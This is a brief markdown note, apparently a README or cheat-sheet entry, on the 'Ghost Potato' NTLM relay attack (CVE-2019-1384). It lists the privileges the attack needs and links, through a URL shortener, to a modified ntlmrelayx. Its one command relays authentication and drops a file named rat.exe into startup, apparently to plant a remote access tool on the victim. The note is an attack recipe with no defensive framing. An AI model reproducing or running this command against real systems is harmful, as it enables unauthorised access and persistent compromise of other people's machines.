# Ghost Potato CVE=2019-1384

## Requirements

#### 1) User must be a member of the local Administrators group

#### 2) User must be a member of the Backup Operators group

#### 3) Token must be elevated 

### Using a modified version of ntlmrelayx: https://tinyurl.com/28udqr6s

 - ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
